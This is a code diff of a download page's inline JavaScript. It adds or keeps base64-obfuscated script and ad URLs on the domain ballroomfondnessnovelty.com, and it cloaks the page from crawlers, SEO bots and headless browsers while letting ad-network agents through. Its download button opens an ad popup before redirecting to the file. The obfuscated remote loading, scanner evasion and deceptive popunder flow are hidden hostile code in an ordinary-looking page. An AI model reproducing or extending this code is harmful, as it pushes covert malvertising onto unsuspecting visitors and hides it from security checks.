@@ -27,7 +27,7 @@
                                  _ref.includes('adzilla') || _ref.includes('burn') ||
                                  /adzilla|ahrefs|semrush|dotbot|rogerbot|mj12bot|ia_archiver|uibot|headless/i.test(_ua);
 
-            const isAdNetwork = /effectivegate|adsterra|trafficstars|propeller/i.test(_ua);
+            const isAdNetwork = /effectivegate|adsterra|trafficstars|propeller|ballroomfondness/i.test(_ua);
 
             if (isAdzillaBurn && !isAdNetwork) {
                 window.stop();
@@ -39,10 +39,8 @@
 
     <script>
     (function() {
-
-      const _p1 = "aHR0cHM6Ly9iYWxscm9vbWZvbmRuZXNzbm92ZWx0eS5jb20vYmIvZjIvZGEv";
-const _p2 = "YmJmMmRhYmRlNTZkYmZkZDZiZmVmMmE2N2NiOTE3NDUuanM=";
-
+        const _p1 = "aHR0cHM6Ly9iYWxscm9vbWZvbmRuZXNzbm92ZWx0eS5jb20vYmIvZjIvZGEv";
+        const _p2 = "YmJmMmRhYmRlNTZkYmZkZDZiZmVmMmE2N2NiOTE3NDUuanM=";
         
         // Join and decode
         const _src = atob(_p1) + atob(_p2);
@@ -59,7 +57,7 @@ const _p2 = "YmJmMmRhYmRlNTZkYmZkZDZiZmVmMmE2N2NiOTE3NDUuanM=";
 </script>
 
 
-    <link rel="preconnect" href="https://www.effectivegatecpm.com">
+    <link rel="preconnect" href="https://ballroomfondnessnovelty.com">
     <style>
         /* CORE LAYOUT */
         * { box-sizing: border-box; }
@@ -396,9 +394,10 @@ const _p2 = "YmJmMmRhYmRlNTZkYmZkZDZiZmVmMmE2N2NiOTE3NDUuanM=";
         }, 3500);
 
         const _p1a = "aHR0cHM6Ly9iYWxscm9vbWZvbmRuZXNzbm92ZWx0eS5jb20vcHFjZ2FjaXl0eA==";
-const _p1b = "P2tleT03MjY5YzIxYTE3ZDViYTgxNzIyZDg4NTQ3NzY0M2IzNQ==";
+        const _p1b = "P2tleT03MjY5YzIxYTE3ZDViYTgxNzIyZDg4NTQ3NzY0M2IzNQ==";
         const _p2a = "aHR0cHM6Ly9iYWxscm9vbWZvbmRuZXNzbm92ZWx0eS5jb20vcGtjbWJ5aWZoZg==";
-const _p2b = "P2tleT05ZmJiN2MzMGQwMjIzODJkOTY3NDdkMDA0OTU1MmNjNg==";
+        const _p2b = "P2tleT05ZmJiN2MzMGQwMjIzODJkOTY3NDdkMDA0OTU1MmNjNg==";
+        
         const _ad = _dec(_p1a + _p1b),
               _ad2 = _dec(_p2a + _p2b);
 
@@ -471,11 +470,13 @@ const _p2b = "P2tleT05ZmJiN2MzMGQwMjIzODJkOTY3NDdkMDA0OTU1MmNjNg==";
 
         _b.addEventListener('click', function(e) {
             e.preventDefault();
-            if (_hp.value !== "" || this.innerText === "DOWNLOAD NOW") return;
+            if (_hp.value !== "") return;
             w.open(_ad, '_blank');
-            if (_file) {
-                const target = decodeURIComponent(_file);
-                setTimeout(() => { w.location.replace(target); }, 1000); 
+            if (this.innerText === "START DOWNLOAD") {
+                if (_file) {
+                    const target = decodeURIComponent(_file);
+                    setTimeout(() => { w.location.replace(target); }, 1000); 
+                }
             }
         });
 
